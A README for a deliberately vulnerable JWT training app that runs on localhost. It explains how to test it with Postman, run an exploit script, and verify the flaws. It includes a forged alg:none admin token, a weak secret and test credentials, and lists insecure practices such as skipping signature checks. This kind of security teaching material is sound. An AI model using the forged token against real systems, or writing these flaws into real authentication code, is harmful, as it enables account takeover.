# 🚨 Vulnerable JWT Application

This application is **intentionally vulnerable** to allow testing and exploitation of common security weaknesses in JSON Web Tokens (JWT). It includes multiple flawed implementations for educational purposes.

---

## 📋 Steps to Test

---

### Step 1: Install Dependencies

```bash
cd app-vulnerable
npm install
Step 2: Start the Application
bash
Copier le code
npm start
🟢 Expected startup message:

arduino
Copier le code
🚨 VULNERABLE APPLICATION STARTED
📍 URL: http://localhost:3000
🧪 Step 3: Test with Postman
🔑 Test 1: Log In
METHOD: POST

URL: http://localhost:3000/login

Body (raw JSON):

json
Copier le code
{
  "username": "alice",
  "password": "pass123"
}
Objective: Obtain a JWT token.

👤 Test 2: View Profile
METHOD: GET

URL: http://localhost:3000/profile

Headers:

makefile
Copier le code
Authorization: Bearer [PASTE_YOUR_TOKEN_HERE]
Objective: View profile data (with sensitive information exposed).

👮‍♂️ Test 3: Attempt Admin Access
METHOD: GET

URL: http://localhost:3000/admin

Headers:

makefile
Copier le code
Authorization: Bearer [PASTE_YOUR_TOKEN_HERE]
❌ Expected Result: Access denied (normal for non-admin users).

🏴‍☠️ Step 4: Run the Automated Exploit
bash
Copier le code
cd ../exploits
npm install
node pirate.js
🎯 Expected Exploit Results:

Admin access via alg:none token

Secret key "secret123" discovered

Sensitive data extracted

🔍 Step 5: Manually Verify Vulnerabilities
Test: Accepting "none" Algorithm Token
METHOD: POST

URL: http://localhost:3000/verify

Body:

json
Copier le code
{
  "token": "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VySWQiOjk5OSwidXNlcm5hbWUiOiJoYWNrZXIiLCJyb2xlIjoiYWRtaW4iLCJpYXQiOjE3NjMzMjM3NDl9."
}
🎯 Expected Result: The "none" algorithm token is accepted!

👤 Test Accounts
Role	Username	Password
Normal User	alice	pass123
Administrator	admin	admin123

⚠️ Vulnerabilities to Observe
alg:none accepted → Signature bypass possible

Weak secret (secret123) → Easily brute-forced

Missing signature verification (decode used) → Accepts tampered tokens

No token expiration → Tokens valid indefinitely

Sensitive data in JWT → Exposes user passwords

⚠️ This app is built for learning and testing. Do not deploy it in production or expose it to the public internet.